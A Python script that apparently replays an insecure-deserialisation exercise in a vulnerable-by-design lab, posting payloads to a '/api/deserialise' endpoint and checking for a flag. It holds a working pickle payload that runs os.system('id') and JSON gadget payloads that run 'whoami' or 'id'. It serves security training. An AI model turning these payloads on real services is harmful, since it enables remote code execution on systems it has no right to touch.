#!/usr/bin/env python3
"""Replay the insecure-deserialise scenario. Standard library only."""
import json
import sys
import urllib.error
import urllib.request

def _post_json(base, path, data):
    url = base.rstrip("/") + path
    payload = json.dumps(data).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=payload,
        method="POST",
        headers={"Content-Type": "application/json"},
    )
    try:
        with urllib.request.urlopen(req) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read() or b"{}")

def attack(base, level):
    if level == "low":
        body = {"payload": "cos\nsystem\n(S'id'\ntR."}
    elif level == "medium":
        body = {"payload": json.dumps({"__class__": "DiagnosticGadget", "cmd": "whoami"})}
    elif level == "high":
        body = {"payload": json.dumps({"__class__": "SafeConfigGadget_Exec", "cmd": "id"})}
    else:
        body = {"payload": "cos\nsystem\n(S'id'\ntR."}

    status, data = _post_json(base, "/api/deserialise", body)
    print(f"  POST /api/deserialise ({level}) -> HTTP {status}")
    flag = data.get("flag")
    if flag:
        print(f"  ✓ Exploited successfully! 🚩 Flag: {flag}")
        return True
    elif data.get("simulated_exec"):
        print(f"  ✓ Simulated execution: {data.get('output')}")
        return True
    print(f"  ✗ Failed or blocked: {data}")
    return False

if __name__ == "__main__":
    base = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
    lvl = sys.argv[2] if len(sys.argv) > 2 else "low"
    print(f"[insecure-deserialise] {base} level={lvl}")
    sys.exit(0 if attack(base, lvl) else 1)
